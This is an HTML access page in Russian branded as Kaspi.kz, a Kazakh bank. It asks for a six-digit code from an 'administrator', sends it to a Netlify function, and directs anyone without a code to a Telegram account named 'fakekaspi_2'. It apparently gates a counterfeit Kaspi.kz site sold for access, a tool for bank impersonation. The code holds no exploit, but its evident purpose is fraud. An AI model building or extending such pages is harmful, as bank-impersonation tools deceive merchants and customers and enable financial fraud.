<!doctype html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />

  <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,maximum-scale=1">
  <meta name="theme-color" content="#ffffff">
  <meta name="robots" content="none">

  <title>Получение доступа</title>

  <!-- favicon -->
  <link rel="icon" href="/main/kaspi.kz_files/favicon.ico">

  <!-- iOS / PWA -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="Kaspi.kz">
  <meta name="apple-mobile-web-app-status-bar-style" content="default">
  <link rel="apple-touch-icon" sizes="180x180" href="/main/img/1024x1024bb.png">

  <style>
    body{
      font-family: system-ui,-apple-system,Arial,sans-serif;
      margin:0;
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      background:#f5f6f8;
    }
    .box{
      width:min(420px, 92vw);
      background:#fff;
      border-radius:14px;
      padding:22px;
      box-shadow:0 10px 30px rgba(0,0,0,.08);
      text-align:center;
    }
    .logo{
      width:88px;
      height:88px;
      margin:0 auto 12px;
      border-radius:20px;
      overflow:hidden;
    }
    .logo img{
      width:100%;
      height:100%;
      object-fit:cover;
    }
    h3{margin:0 0 8px}
    p{margin:0 0 16px; color:#555; font-size:14px; line-height:1.35}
    input{
      width:100%;
      box-sizing:border-box;
      padding:14px 12px;
      border-radius:12px;
      border:1px solid #d9dce3;
      outline:none;
      font-size:16px;
      text-align:center;
      letter-spacing:3px;
    }
    input:focus{border-color:#6aa9ff; box-shadow:0 0 0 3px rgba(106,169,255,.18)}
    .btn{
      width:100%;
      box-sizing:border-box;
      padding:14px 12px;
      border-radius:12px;
      border:none;
      cursor:pointer;
      font-size:16px;
      font-weight:600;
      margin-top:10px;
    }
    .btn-primary{background:#111; color:#fff}
    .btn-primary:active{transform:translateY(1px)}
    .btn-tg{
      display:block;
      text-decoration:none;
      background:#0088cc;
      color:#fff;
      line-height:20px;
      text-align:center;
    }
    .sep{
      margin:14px 0 10px;
      height:1px;
      background:#eceef2;
    }
    #st{
      margin-top:12px;
      font-size:14px;
      color:#111;
      min-height:18px;
    }
    .muted{opacity:.7}
  </style>
</head>
<body>
  <div class="box">

    <!-- ЛОГО -->
    <div class="logo">
      <img src="/main/img/1024x1024bb.png" alt="Kaspi.kz">
    </div>

    <h3>Получение доступа</h3>
    <p>Введите одноразовый код (6 цифр), который вы получили у администратора.</p>

    <input id="code" placeholder="------" inputmode="numeric" maxlength="6" />

    <button class="btn btn-primary" id="go">Подтвердить код</button>

    <div id="st" class="muted"></div>

    <div class="sep"></div>

    <p class="muted">Нет кода - напишите в Telegram для получения доступа</p>
    <a class="btn btn-tg" href="https://t.me/fakekaspi_2" target="_blank" rel="noopener">
      Написать в Telegram
    </a>
  </div>

  <script>
    const st = document.getElementById("st");
    const input = document.getElementById("code");
    const btn = document.getElementById("go");

    function onlyDigits(s){ return s.replace(/\D+/g, ""); }

    input.addEventListener("input", () => {
      input.value = onlyDigits(input.value).slice(0, 6);
    });

    btn.onclick = async () => {
      const code = input.value.trim();
      if (code.length !== 6) {
        st.textContent = "Введите 6 цифр.";
        return;
      }

      btn.disabled = true;
      st.textContent = "Проверяем код...";

      try {
        const r = await fetch("/.netlify/functions/bind", {
          method: "POST",
          headers: {"Content-Type":"application/json"},
          body: JSON.stringify({ code }),
          credentials: "include"
        });

        if (r.ok) {
          st.textContent = "Доступ получен. Откройте сайт заново.";
          setTimeout(() => location.href = "/", 800);
        } else {
          st.textContent = "Неверный или истёкший код. Напишите администратору.";
        }
      } catch {
        st.textContent = "Ошибка сети. Попробуйте ещё раз.";
      } finally {
        btn.disabled = false;
      }
    };
  </script>
</body>
</html>
